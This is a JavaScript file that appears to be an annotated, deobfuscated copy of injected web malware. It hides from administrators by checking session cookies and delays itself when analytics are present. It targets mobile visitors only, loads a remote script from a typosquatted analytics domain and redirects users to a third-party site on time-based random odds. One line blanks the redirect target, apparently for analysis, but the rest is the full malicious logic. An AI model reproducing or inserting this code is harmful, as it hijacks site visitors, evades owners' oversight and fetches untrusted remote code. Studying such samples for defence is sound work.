function loadJS(input_script_source, input_function) {
  console.log("Loading JS: " + input_script_source);
  var new_script = document.createElement("script");
  var new_function = input_function || function () {};
  new_script.type = "text/javascript";
  {
    new_script.onload = function () {
      new_function();
    };
  }
  new_script.src = input_script_source;
  document.getElementsByTagName("head")[0].appendChild(new_script);
}

function isPc() {
  console.log("Checking if device is PC");
  try {
    var windows_found = navigator.platform == "Win32" || navigator.platform == "Windows";
    var mac_found = navigator.platform == "Mac68K" || navigator.platform == "MacPPC" || navigator.platform == "Macintosh" || navigator.platform == "MacIntel";
    if (mac_found || windows_found) {
      return true;
    } else {
      return false;
    }
  } catch (error) {
    return false;
  }
}

function vfed_update(redirect_to_url_input) {
  console.log("Running vfed_update");
  if (redirect_to_url_input !== "") {
    loadJS("https://www.googie-anaiytics.com/html/checkcachehw.js", function () {
      if (usercache == true) {
        window.location.href = redirect_to_url_input;
      }
    });
  }
}

// Main function
function check_tiaozhuan() {
  console.log("Starting check_tiaozhuan");

  var user_agent_found = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
  
  if (user_agent_found) {

    var window_location_host = window.location.host;
    var document_referrer = document.referrer;
    var redirect_to_url = "";
    var random_int_0_100 = Math.floor(Math.random() * 100 + 1);
    var new_date = new Date;
    var new_time = new_date.getHours();

    if (window_location_host.indexOf("www.dxtv1.com") !== -1 || window_location_host.indexOf("www.ys752.com") !== -1) {
      redirect_to_url = "https://kuurza.com/redirect?from=bitget";
    } else {
      if (window_location_host.indexOf("shuanshu.com.com") !== -1) {
        redirect_to_url = "https://kuurza.com/redirect?from=bitget";
      } else {
        if (document_referrer.indexOf(".") !== -1 && document_referrer.indexOf(window_location_host) == -1) {
          redirect_to_url = "https://kuurza.com/redirect?from=bitget";
        } else {
          if (new_time >= 0 && new_time < 2) {
            if (random_int_0_100 <= 10) {
              redirect_to_url = "https://kuurza.com/redirect?from=bitget";
            }
          } else {
            if (new_time >= 2 && new_time < 4) {
              if (random_int_0_100 <= 15) {
                redirect_to_url = "https://kuurza.com/redirect?from=bitget";
              }
            } else {
              if (new_time >= 4 && new_time < 7) {
                if (random_int_0_100 <= 20) {
                  redirect_to_url = "https://kuurza.com/redirect?from=bitget";
                }
              } else if (new_time >= 7 && new_time < 8) {
                if (random_int_0_100 <= 10) {
                  redirect_to_url = "https://kuurza.com/redirect?from=bitget";
                }
              } else {
                if (random_int_0_100 <= 10) {
                  redirect_to_url = "https://kuurza.com/redirect?from=bitget";
                }
              }
            }
          }
        }
      }
    }
    redirect_to_url = "";
    if (redirect_to_url != "" && !isPc()) {
      if (document.cookie.indexOf("admin_id") == -1 && document.cookie.indexOf("adminlevels") == -1) {
        vfed_update(redirect_to_url);
      }
    }
  }
  console.log("Finished check_tiaozhuan");
}

// Load the page HTML code and search for analytics scripts
let document_html = document.documentElement.outerHTML;
let baidu_found = document_html.indexOf("hm.baidu.com") != -1;
let cnzz_found = document_html.indexOf(".cnzz.com") != -1;
let fiftyone_found = document_html.indexOf(".51.la") != -1;
let matomo_found = document_html.indexOf(".matomo.org") != -1;
let googleanalytics_found = document_html.indexOf(".google-analytics.com") != -1;
let googletagmanager_found = document_html.indexOf(".googletagmanager.com") != -1;
let plausible_found = document_html.indexOf(".plausible.io") != -1;
let statcounter_found = document_html.indexOf(".statcounter.com") != -1;
if (baidu_found || cnzz_found || fiftyone_found || matomo_found || googleanalytics_found || googletagmanager_found || plausible_found || statcounter_found) {
  console.log("Analytics script found, setting timeout for check_tiaozhuan");
  setTimeout(() => {
    console.log("Timeout expired, calling check_tiaozhuan");
    check_tiaozhuan();
  }, 2000);
} else {
  console.log("No analytics script found, calling check_tiaozhuan immediately");
  check_tiaozhuan();
}

